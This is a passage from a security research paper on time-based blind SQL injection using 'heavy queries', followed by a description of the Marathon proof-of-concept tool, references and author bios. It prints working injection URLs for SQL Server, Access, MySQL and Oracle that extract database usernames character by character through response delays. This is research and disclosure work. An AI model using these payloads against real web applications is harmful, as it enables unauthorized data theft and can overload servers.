http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 118>(select top 1 
ascii(substring(name,1,1)) from sysusers)  1 s  FALSE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 119>(select top 1 
ascii(substring(name,1,1)) from sysusers)  1 s  FALSE 
Then the result is ASCII(119)=’w’, and then we start with the second character: 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 150>(select top 1 
ascii(substring(name,1,1)) from sysusers)  ¿?  
This example is running with Microsoft SQL Server 2000 but it runs in the similar way in 
Microsoft SQL Server 2005. 
2.2 Microsoft Access 2000 
Microsoft Access 2000 databases contain a little set of tables for storing information about the 
objects created in them. One of these tables is MSysAccessObjects and by default all the users 
connected to the database has granted access to it. This table stores some records so it is 
perfect for doing a time-based Blind SQL Injection attack. The figures 5 and 6 show how to do it:  
http://www.informatica64.com/retohacking/pista.aspx?id_pista=1 and (SELECT count(*) FROM 
MSysAccessObjects A 20T1, MSysAccessObjects AS T2, MSysAccessObjects AS T3, 
MSysAccessObjects AS T4, MSysAccessObjects AS T5, MSysAccessObjects AS T6, 
MSysAccessObjects AS T7,MSysAccessObjects AS T8,MSysAccessObjects AS 
T9,MSysAccessObjects AS T10)>0 and exists (select * from contrasena)  
This example shows a heavy query for Microsoft Access 2000 databases with a delay of six 
seconds. An attacker can extract all information using the same method shown in the Microsoft 
SQL Server example and using this heavy query as a second condition in the “where clause” to 
delay the response in the positive answers. 
Figure 5: Positive Result in a Microsoft Access2000 database. The response time is 6 seconds. 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 7 of 12 
Figure  6. egative Result in a Microsoft Access2000 database. The response time is 1 second. 
2.3 MySQL 5 
MySQL 5.x includes new features from prior versions including a new dictionary in the schema 
called Information_Schema. In previous versions of MySQL is needed to know or to guess a 
table with some records for doing an injection with a heavy query in previous versions. In this 
example a Time-Based Blind SQL injection with a heavy query attack had been proved using 
columns table from Information_Schema in a MySQL version 5. The results obtained are shown 
in figures 7 and 8. 
http://www.kachakil.com/pista.aspx?id_pista=1 and exists (select * from contrasena) and 100 > 
(select count(*) from information_schema.columns, information_schema.columns T1, 
information_schema T2) 
Figure 7. Positive Result in a MySQL database. The response time is 30 seconds. 
Figure 8. egative Result in a MySQL database. The response time is 1 second. 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 8 of 12 
2.4 
Oracle 
In this example, with an Oracle Database engine, a heavy query using the view all_users from 
the sys schema had been done for obtaining a time-delay. This view is granted select to all 
users with Connect role. In this case, the query extracts information about the first username’s 
letter of the first record in the table itself. The results are displayed in figures 9 and 10. 
http://blind.elladodelmal.com/oracle/pista.aspx?id_pista=1 and (select count(*) from all_users t1, all_users 
t2, all_users t3, all_users t4, all_users t5)>0 and 300>(ascii(SUBSTR((select username from all_users 
where rownum = 1),1,1)) 
Figure 9. Positive Answer in an Oracle database. The response time is 40 seconds. 
Figure 10. egative answer in an Oracle database. The response time is 1 second. 
3 .  HEAVY QUERIES 
As these simple examples have shown, an attacker can perform a time-based blind SQL 
injection exploitation just by using any heavy query. Furthermore, the attacker can use this 
method with any database engine if they know (or can guess) the name of a table with recorded 
data. Thus, the perimeter protection countermeasures that normally aim to create an in-depth 
defense policy, such as disabling the access to stored procedures or benchmark functions, 
definitely do not protect the system from these attacks. Developing secure code is the key to 
avoiding these kinds of vulnerabilities. 
In this paper very big heavy queries have been used just to obtain a very easy measurable 
time-delay but in a real exploitation of this technique a more adjusted “heavy query” should be 
used for a more optimized and quicker information extraction. 
As a better exemplification we develop a tool to extract information from databases using this 
method and it is explained in following section. 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 9 of 12 
4. MARATHON TOOL 
Marathon Tool is a POC about using heavy queries to perform a Time-Based Blind SQL 
Injection attack. This tool is still in progress but is right now in a very good alpha version to 
extract information from web applications using Microsoft SQL Server, MySQL or Oracle 
Databases. 
4.1.  
Configuration Section 
In this section first of all must be configured information about the web application. This 
information is in the Basic Configuration panel: 
Figure 11: Marathon Tool Configuration Section. Basic Configuration Panel. 
- 
Database Engine: Microsoft SQL Server, MySQL or Oracle Database Server. When 
Microsoft SQL Server is selected, Marathon Tool will use, by default, sys.databases or 
sysusers tables to construct the heavy queries. If Oracle Database is selected then the 
tables used by default will be user_objects, all_objects or user_tables. If MySQL, then 
the table configured by default is information_schema.columns.  These tables can be 
changed in the injection options. 
- 
Target base URL: Web application to test and connection details. SSL is not supported 
in this version. 
- 
Parameters: Can be GET or POST parameters, and can be injectable parameters or 
not. The application will try to find out heavy queries for all the injectable ones. 
- 
Cookies: A list of variables and values in the cookie can be configured in this section 
but this version don´t support dynamic values. 
- 
Authentication: In this section user credentials can be setup to connect to the web 
application before start the test. This version supports Basic, Digest and NTLM 
authentication methods. 
- 
Proxy: An http proxy can be setup. 
- 
Start Injection with and End Injection with are used to configure a prefix and/or a suffix 
value in the injection test. 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 10 of 12 
Figure 12: Marathon Tool Configuration Section. Authentication Methods. 
As it could be seen in Figure 13 there are several parameters that could be tuned to improve 
the performance of the tool in the injection options panel: 
Figure 13: Marathon Tool Configuration Section. Basic Configuration Panel. 
- 
Min heavy query time: This parameter sets the minimal amount of time between a true 
answer and a false answer. If the difference between the true response time and false 
response time is lower than this value Marathon tool will keep on looking for a new 
heavy query. If the tool is being tested in a local network with a very good connection 
then this value can be small, either the value should be increased. 
- 
Http request timeout: After this time the client shutdown the connection assuming this 
query as a heavy query. 
- 
Request tests count: Once the tool detect a true answer repeats the test to make sure it 
is due to the heavy query and not to the any other reason. 
- 
Pause after heavy query:  After every heavy query the tool pauses this time. This is due 
to the fact that a big amount of big heavy queries at the same time could result in false 
positives or in a denial of service attack against the web application. 
- 
Pause after any query: After every query, no matter if it is a heavy one or not the tool 
pauses this time. 
- 
Minimum joins for queries: This value is the initial number of tables used in query when 
the tool is looking for a heavy query. 
- 
Maximum joins for queries: If the tool hasn´t found a heavy query after construct a 
query with this number of tables in join clause then the tool stops. 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 11 of 12 
- 
Enable equal sign in selects: To construct the heavy query, on depends on web 
application, web firewalls or databases, the tool constructs the heavy queries using 
relational operators or equals operators. 
- 
Heavy queries tables: These are the tables Marathon Tool will use to construct heavy 
queries. On depend on the database engine selected the tool configures different ones, 
but can be entered by user. 
Once the Configuration section is ready and the injection options are configured, Marathon Tool 
needs to initialize the test. In this initialization test Marathon Tool will look for a valid heavy 
query in the injectable value to prove the configuration as valid. When it finished the tool can 
retrieve the schema of the database or the user used in the web application to connect against 
the database engine. 
Figure 14: Marathon Tool Configuration Section. Basic Start Injection. 
4.2. 
 Database Schema 
This section shows the information Marathon Tool has collected from the web application using 
Time-Based Blind SQL Injection with heavy queries. It is not a quick method for extracting 
information but in some web applications based in database engines without time-delay 
functions could be the only exploitation method. 
Figure 15: Marathon Tool Database Schema 
4.3.  
Debug Log Section 
This panel shows the queries throw against the web application. It has different detail levels to 
see all the tests, only the positive answers or only the values Marathon Tool is collecting. This 
log is a good tool to analyze the behaviour of the web application in the test and it is good for 
tuning purposes.  
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 12 of 12 
Figure 16: Marathon Tool Debug Log Section 
References 
[1] “(More) 
Advanced 
SQL 
Injection”. 
Chris 
Anley. 
NGS 
Software 
URL: 
http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf 
[2] “Blindfolded SQL Injection”. Authors: Ofer Maor y Amichai Shulman. Imperva 
URL:http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html  
[3] “Blind SQL Injection Automation Techniques”. Author: Cameron Hotchkies. BlackHat Conferences. 
URL:https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf 
[4] “Absinthe”. Author: Cameron Hotchkies. 0x90.URL: http://www.0x90.org/releases/absinthe/download.php 
[5] “Data Mining with SQL Injection and Inference”. Author: David Litchfield. NGS Software.  URL: 
http://www.ngssoftware.com/research/papers/sqlinference.pdf ]  
[6] “SQL Injection Cheat Sheet”. Author: Ronald van den Heetkamp. 0x000000. URL: 
http://www.0x000000.com/?i=14&bin=1110 
[7] “Solar Empire’s Exploit”. Author: Blackhawk. Milw0rm. URL: http://www.milw0rm.com/exploits/4078  
[8] “…a SQL Server Injection & takeover tool… ”. Author: icesurfer. SQLNinja. URL: http://sqlninja.sourceforge.net   
[9] “SQL PowerInjector”. Author: Francois Larouche. SQL PowerInjector. URL: http://www.sqlpowerinjector.com  
Authors 
Chema Alonso Chema Alonso is a Computer Engineer by the Rey Juan Carlos University and System Engineer by the 
Politécnica University of Madrid. He has been working as security consultant last six years and had been awarded as 
Microsoft Most Valuable Professional from 2005 to present time. He is a Microsoft frequent speaker in Security 
Conferences. He writes monthly in several Spanish Technical Magazines as “Windows TI Magazine”, “PC Actual” or 
“Hackin9”. He is currently working on his PhD thesis under the direction of Dr. Antonio Guzmán and Dr. Marta Beltran. 
PI:EMAIL  
Daniel Kachakil received the degree in Systems Engineer and the Master degree on Software Engineering by the 
University Politécnica of Valencia. PI:EMAIL  
Rodolfo Bordón received the degree in Software Specialist Technician and works as System Security Consultant. 
PI:EMAIL  
Antonio Guzmán received the degree in Physics Science in 1999 and Ph.D. degree  in Computer Science in 2006 from 
Rey Juan Carlos University of Madrid, Spain. Since 2000, he has been an Assistant Professor with the Department of 
Computer Architecture and Technology, Rey Juan Carlos University. PI:EMAIL  
Marta Beltrán received the Laurea com Laude degree in electronic engineering in 2000, from Complutense University 
of Madrid, Spain and the degree in Physics Science in 2002, from UNED, Spain. She Received the Ph.D. degree in 
Computer Science in 2005 form Rey Juan Carlos University of Madrid, Spain. Since 2000 to 2006 she works as 
assistant professor in Rey Juan Carlos University. Since 2006 she is Titular Professor in the same university. 
PI:EMAIL